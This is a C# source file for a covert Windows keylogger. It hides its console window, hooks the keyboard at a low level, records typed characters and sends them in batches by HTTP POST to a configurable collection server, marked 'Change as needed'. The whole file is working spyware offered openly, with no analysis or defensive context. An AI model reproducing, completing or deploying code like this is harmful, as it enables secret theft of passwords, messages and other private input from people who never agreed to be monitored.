using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

class KeyLogger
{
    private const string SERVER_URL = "http://127.0.0.1:2000/log"; // Change as needed
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static StringBuilder buffer = new StringBuilder();
    private static bool capsLockOn = Control.IsKeyLocked(Keys.CapsLock);
    private static IntPtr hookId = IntPtr.Zero;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;

    static void Main()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, 0); // Hide console window

        hookId = SetHook(proc);
        Application.Run();
        UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;

            if (key == Keys.CapsLock)
            {
                capsLockOn = !capsLockOn;
                return (IntPtr)1; // Skip default processing
            }

            if (key == Keys.Back && buffer.Length > 0)
            {
                buffer.Length--; // Remove last char
                return (IntPtr)1;
            }

            string keyStr = key.ToString();
            if (keyStr.Length == 1)
            {
                char ch = keyStr[0];
                if (capsLockOn ^ Control.ModifierKeys.HasFlag(Keys.Shift))
                {
                    ch = char.ToUpper(ch);
                }
                else
                {
                    ch = char.ToLower(ch);
                }

                buffer.Append(ch);
            }

            if (buffer.Length >= 3)
            {
                string data = buffer.ToString();
                buffer.Clear();
                new Thread(() => SendToServer(data)).Start();
                Thread.Sleep(300); // Prevent request spamming
            }
        }

        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    private static void SendToServer(string data)
    {
        try
        {
            using (WebClient client = new WebClient())
            {
                var postData = $"data={Uri.EscapeDataString(data)}";
                client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                client.UploadString(SERVER_URL, "POST", postData);
            }
        }
        catch (Exception ex)
        {
            // Optionally log the error
        }
    }

    // Windows API Imports
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk,
        int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
